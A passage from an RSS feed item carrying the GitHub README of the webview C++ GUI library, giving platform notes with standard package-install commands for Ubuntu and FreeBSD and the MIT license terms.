&lt;p&gt;Also, there is a more more advanced complete C++ app, &lt;a href="https://github.com/zserge/slide"&gt;Slide&lt;/a&gt;, that uses webview as a GUI. You may have a look how webview apps can be built, packaged and how automatic CI/CD can be set up.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-notes" class="anchor" aria-hidden="true" href="#notes"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Notes&lt;/h2&gt;
&lt;p&gt;Execution on OpenBSD requires &lt;code&gt;wxallowed&lt;/code&gt; &lt;a href="https://man.openbsd.org/mount.8" rel="nofollow"&gt;mount(8)&lt;/a&gt; option.
For Ubuntu Users run &lt;code&gt;sudo apt install webkit2gtk-4.0&lt;/code&gt; to install webkit2gtk-4.0 related items.
FreeBSD is also supported, to install webkit2 run &lt;code&gt;pkg install webkit2-gtk3&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-license" class="anchor" aria-hidden="true" href="#license"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;License&lt;/h2&gt;
&lt;p&gt;Code is distributed under MIT license, feel free to use it in your proprietary
projects as well.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>zserge</author><guid isPermaLink="false">https://github.com/zserge/webview</guid><pubDate>Tue, 04 Feb 2020 00:25:00 GMT</pubDate></item></channel></rss>